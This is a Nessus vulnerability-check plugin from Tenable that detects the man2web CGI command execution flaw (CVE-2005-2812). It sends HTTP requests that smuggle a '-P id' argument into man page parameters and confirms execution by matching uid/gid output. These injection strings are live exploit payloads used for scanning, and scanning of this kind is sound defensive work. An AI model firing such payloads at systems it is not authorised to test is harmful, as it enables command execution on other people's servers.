#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a CGI script that allows for arbitrary
command execution. 

Description :

The remote host appears to be running man2web, a program for
dynamically converting unix man pages to HTML. 

The installed version of man2web allows attackers to execute arbitrary
shell commands on the remote host subject to the privileges of the web
server user id. 

Solution : 

Unknown at this time.

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19591);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2812");
  script_bugtraq_id(14747);

  name["english"] = "man2web Command Execution Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for command execution vulnerability in man2web";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# nb: not sure if this is from man2web.
http_check_remote_code(
  extra_dirs:"",
  check_request:"/man-cgi?-P%20id%20ls",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  description:desc["english"],
  port:port
);

# nb: this is definitely part of man2web.
http_check_remote_code(
  extra_dirs:"",
  check_request:"/man2web?program=-P%20id%20ls",
  extra_check:"Man Page Lookup - -P id ls",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  description:desc["english"],
  port:port
);

# nb: not sure if this is from man2web.
http_check_remote_code(
  extra_dirs:"",
  check_request:"/man2html?section=-P%20id&topic=w",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  description:desc["english"],
  port:port
);


